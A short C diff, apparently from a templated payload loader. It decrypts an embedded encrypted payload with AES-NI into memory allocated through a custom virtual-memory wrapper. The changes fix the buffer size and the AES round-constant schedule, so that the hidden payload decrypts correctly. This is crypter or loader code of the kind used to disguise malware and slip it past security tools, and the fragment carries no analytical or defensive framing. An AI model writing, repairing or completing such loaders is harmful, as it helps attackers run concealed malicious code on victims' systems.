@@ -113,7 +113,7 @@ int main() {{
     }}
     
     /* Decrypt payload */
-    PBYTE pDecrypted = ALIOTHAllocVirtualMemory(g_Payload_OriginalSize, PAGE_READWRITE);
+    PBYTE pDecrypted = ALIOTHAllocVirtualMemory(g_Payload_Size, PAGE_READWRITE);
     memcpy(pDecrypted, g_Payload_Encrypted, g_Payload_Size);
     
     /* AES-NI decrypt */
@@ -121,8 +121,9 @@ int main() {{
     __m128i key = _mm_loadu_si128((__m128i*)g_Payload_Key);
     roundKeys[0] = key;
     
+    static const int rcon[10] = {{1, 2, 4, 8, 16, 32, 64, 128, 27, 54}};
     for (int r = 1; r <= 10; r++) {{
-        __m128i temp = _mm_aeskeygenassist_si128(key, r);
+        __m128i temp = _mm_aeskeygenassist_si128(key, rcon[r - 1]);
         key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
         key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
         key = _mm_xor_si128(key, _mm_shuffle_epi32(temp, 0xFF));
